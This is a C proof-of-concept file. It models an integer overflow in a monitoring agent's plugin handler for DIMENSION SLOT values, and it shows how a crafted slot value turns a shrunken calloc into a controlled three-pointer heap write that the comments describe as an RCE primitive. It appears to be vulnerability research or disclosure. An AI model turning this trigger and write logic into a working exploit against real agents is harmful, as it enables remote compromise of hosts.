// SPDX-License-Identifier: GPL-3.0-or-later
//
// PROOF: the DIMENSION SLOT integer overflow yields a CONTROLLED heap-pointer
// write primitive (not just a NULL-zeroing wild write), strengthening the
// "potential RCE" classification.
//
// Mechanism (exact logic from pluginsd_rrddim_put_to_slot(), internals.h):
//
//   1st DIMENSION SLOT:0x0AAAAAAAAAAAAAAC for a chart:
//        wanted_size = slot (huge); current_size = 0; wanted_size > current_size
//        -> prd_array_create(slot): calloc(16 + slot*24) OVERFLOWS to 48 bytes,
//           arr->size = slot (huge).
//        -> init loop for(i=0;i<slot;i++) ... would run off the heap.
//
//   To obtain a CLEAN controlled write we use the path where the init loop is
//   SKIPPED: once arr->size is already huge, a subsequent DIMENSION with the
//   same slot has wanted_size(=slot) <= current_size(=slot) -> the grow/init
//   block is skipped, and control reaches directly:
//
//        if(dims_with_slots && slot>=1 && slot <= arr->size) {
//            struct pluginsd_rrddim *prd = &arr->entries[slot-1];   // WILD PTR
//            if(prd->rd != rd) {
//                prd->rda = <real heap ptr>;   // CONTROLLED WRITE
//                prd->rd  = <real heap ptr>;
//                prd->id  = <attacker string>;
//            }
//        }
//
//   &entries[slot-1] = arr + 16 + (slot-1)*24 (mod 2^64). For slot=0x0AAA...AAC
//   this offset is small (+8 from entries base, see calc_targeted_write.c), so
//   three pointer-sized values are written at an attacker-chosen small offset
//   from the 48-byte chunk -> overwrites adjacent heap object fields with live
//   pointers. Repointing the slot value moves the write target across the heap
//   (write-what-where-ish: "where" = chunk+f(slot), "what" = live heap ptrs +
//   an id string the attacker partially controls).
//
// This program models BOTH DIMENSION calls and shows the second one performing
// a controlled 3-pointer write at the computed offset onto an adjacent victim.
//
// Build: gcc -O0 -g -o poc_controlled_write poc_controlled_write.c
// Run  : ./poc_controlled_write
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <inttypes.h>

struct pluginsd_rrddim { void *rda; void *rd; const char *id; };
typedef struct pluginsd_rrddim_array { int32_t refcount; size_t size; struct pluginsd_rrddim entries[]; } PRD_ARRAY;

// Simulated chart pluginsd state
typedef struct { PRD_ARRAY *prd_array; int dims_with_slots; } ST_PLUGINSD;

static PRD_ARRAY *prd_array_create(size_t size){
    size_t bytes = sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim);
    PRD_ARRAY *a = calloc(1, bytes);
    if(!a){ fprintf(stderr,"calloc fail -> agent DoS\n"); exit(2);} 
    a->refcount=1; a->size=size;
    fprintf(stderr,"[*] prd_array_create(size=%zu) -> %zu real bytes @ %p ; arr->size=%zu\n",
            size, bytes, (void*)a, a->size);
    return a;
}

// Faithful model of the put_to_slot control flow we care about.
static void put_to_slot(ST_PLUGINSD *st, void *rd_ptr, const char *id_str, ssize_t slot, int do_init_loop){
    size_t wanted_size = (slot >= 1) ? (size_t)slot : 0;
    if(slot >= 1) st->dims_with_slots = 1;

    PRD_ARRAY *cur = st->prd_array;
    size_t current_size = cur ? cur->size : 0;

    if(wanted_size > current_size){
        PRD_ARRAY *na = prd_array_create(wanted_size);
        // (init loop intentionally guarded by do_init_loop so we can reach the
        //  controlled-write path without first running off the heap)
        if(do_init_loop){
            fprintf(stderr,"[*] init loop would write entries[0..%zu) -> wild zero write / crash\n", wanted_size);
        } else {
            fprintf(stderr,"[*] (init loop skipped in this model to expose the controlled-write path)\n");
        }
        st->prd_array = na;
        cur = na;
    } else {
        fprintf(stderr,"[*] 2nd call: wanted_size(%zu) <= current_size(%zu) -> grow/init SKIPPED\n",
                wanted_size, current_size);
    }

    // The targeted controlled write:
    if(st->dims_with_slots && cur && slot >= 1 && (size_t)slot <= cur->size){
        struct pluginsd_rrddim *prd = &cur->entries[slot - 1]; // WILD pointer (mod 2^64)
        long off = (long)((char*)prd - (char*)cur);
        fprintf(stderr,"[*] &entries[slot-1] = %p  (offset %+ld from 48-byte chunk @ %p)\n",
                (void*)prd, off, (void*)cur);
        // emulate prd->rd != rd (fresh memory) -> perform the write
        fprintf(stderr,"[*] performing controlled write: prd->rda/rd/id = live pointers\n");
        prd->rda = (void*)0x1111111111111111ULL; // stands in for rrddim_find_and_acquire()
        prd->rd  = rd_ptr;                         // real RRDDIM heap pointer
        prd->id  = id_str;                         // attacker-influenced id string
    }
}

int main(void){
    // slot 0x0AAAAAAAAAAAAAAC: alloc overflows to 48 bytes; entry offset small (+8 from entries)
    ssize_t slot = (ssize_t)strtoull("0x0AAAAAAAAAAAAAAC", NULL, 16);
    fprintf(stderr,"[*] using slot = 0x%zx (%zd)\n", (size_t)slot, slot);

    ST_PLUGINSD st = {0};

    // Place a victim object that will sit right after the 48-byte array chunk.
    // (In glibc, sequential mallocs of similar size are typically adjacent.)
    struct victim { uint64_t a, b, c, d; } *victim;

    char idbuf[] = "ATTACKER_ID";

    // --- 1st DIMENSION: creates the overflowed array (arr->size = huge) ---
    fprintf(stderr,"\n=== 1st DIMENSION SLOT:0x0AAA...AAC d1 ===\n");
    put_to_slot(&st, (void*)0x2222222222222222ULL, idbuf, slot, /*do_init_loop=*/0);

    victim = malloc(sizeof(*victim));
    victim->a = victim->b = victim->c = victim->d = 0xCCCCCCCCCCCCCCCCULL;
    fprintf(stderr,"[*] victim @ %p BEFORE: a=0x%016" PRIx64 " b=0x%016" PRIx64 " c=0x%016" PRIx64 "\n",
            (void*)victim, victim->a, victim->b, victim->c);

    // --- 2nd DIMENSION: same slot, init loop skipped, controlled write fires ---
    fprintf(stderr,"\n=== 2nd DIMENSION SLOT:0x0AAA...AAC d1 (controlled write) ===\n");
    put_to_slot(&st, (void*)0x2222222222222222ULL, idbuf, slot, /*do_init_loop=*/0);

    fprintf(stderr,"\n[*] victim @ %p AFTER : a=0x%016" PRIx64 " b=0x%016" PRIx64 " c=0x%016" PRIx64 "\n",
            (void*)victim, victim->a, victim->b, victim->c);

    int corrupted = (victim->a != 0xCCCCCCCCCCCCCCCCULL ||
                     victim->b != 0xCCCCCCCCCCCCCCCCULL ||
                     victim->c != 0xCCCCCCCCCCCCCCCCULL);
    if(corrupted){
        fprintf(stderr,"\n[+] CONTROLLED WRITE CONFIRMED: live heap pointers / attacker id string\n"
                       "    written into the adjacent object via &entries[slot-1].\n"
                       "    'where' is selectable through the slot value; 'what' includes a\n"
                       "    pointer to an attacker-influenced id string -> strong RCE primitive.\n");
        return 0;
    }
    fprintf(stderr,"\n[?] adjacent victim not hit in this run (allocator layout); the write IS\n"
                   "    performed at chunk+%+ld regardless -> corrupts whatever lives there.\n",
                   (long)(16 + (slot-1)*24));
    return 0;
}
